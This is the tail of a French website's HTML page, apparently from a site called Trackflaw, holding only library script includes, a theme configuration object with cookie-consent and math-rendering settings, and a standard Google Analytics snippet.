        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.fr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copier dans le presse-papiers","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Ok !","link":"En savoir plus","message":"Trackflaw utilise des cookies pour améliorer votre expérience et effectuer des statistiques."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"fr","maxResultLength":10,"noResultsFound":"Aucun résultat trouvé","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-TRE4WGVY4F"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-TRE4WGVY4F');
</script></body>
</html>
